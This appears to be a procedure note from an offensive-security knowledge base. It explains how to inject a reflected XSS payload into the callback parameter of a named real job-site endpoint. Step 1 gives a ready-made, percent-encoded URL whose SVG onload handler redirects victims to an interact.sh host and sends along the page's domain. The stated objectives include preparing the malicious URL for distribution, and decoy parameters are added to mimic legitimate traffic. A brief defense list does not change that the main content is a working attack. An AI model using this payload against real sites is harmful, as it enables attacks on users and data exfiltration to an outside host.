---
tags:
  - xss
  - payload-injection
  - endpoint-exploitation
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:52:49.475Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: de689db8-78cd-4342-b9c4-de3e7cff3aea
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Inject-Payload-into-Callback-Parameter

## Summary

This procedure injects the encoded XSS payload into the vulnerable callback parameter of the Glassdoor endpoint, confirming reflection without sanitization to enable HTML/JS execution.

## Description

The /job-listing/spotlight endpoint reflects the callback parameter directly into the response as part of a JSONP-like structure, but without proper Content-Type enforcement, allowing HTML parsing. This step tests the injection in a controlled manner using a proxy. Expected outcome: Unsanitized reflection leading to payload execution on load.

## Requirements

1. Encoded payload from prior procedure
2. Burp Suite for request interception and modification
3. Access to the target URL: https://www.glassdoor.com/job-listing/spotlight

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all query parameters before reflection
- Enforce strict Content-Type headers (e.g., text/javascript)
- Implement Web Application Firewall (WAF) rules to detect SVG/HTML in parameters
- Log and alert on unusual callback values or response anomalies

## Objectives

1. Confirm vulnerability by observing payload reflection
2. Prepare malicious URL for distribution
3. Ensure payload survives server-side processing

## Instructions

### Step 1: Construct the Malicious URL

**Context**: Build the full request URL with the encoded payload in the callback parameter.

Manually assemble: `https://www.glassdoor.com/job-listing/spotlight?slots=spotlight-mrec-lf-display&gdBaseUrl=first%2D%2D%3E&adOrderIds=second&callback=%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%3C%68%74%6D%6C%3E%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%6C%6F%63%61%74%69%6F%6E%2F%2A%2A%2F%3D%27%68%74%74%70%73%3A%2F%2F%63%33%72%71%6D%77%6B%79%65%64%66%30%30%30%30%72%33%6D%72%30%67%62%68%6D%34%73%63%79%79%79%79%79%62%2E%69%6E%74%65%72%61%63%74%2E%73%68%2F%27%2B%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%3E%3C%2F%68%74%6D%6C%3E%3C%21%2D%2D`.

> This includes decoy parameters to mimic legitimate traffic. Expected output: Valid URL ready for sending.

### Step 2: Send and Intercept Request

**Context**: Use a proxy to send the request and inspect the response for reflection.

Configure Burp Suite proxy, navigate to the URL in a browser or use Repeater to send GET request.

> Inspect response: Look for decoded payload in HTML source. Expected output: Reflection like `<svg/onload=...` without escaping, confirming vulnerability.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[payload-injection]]
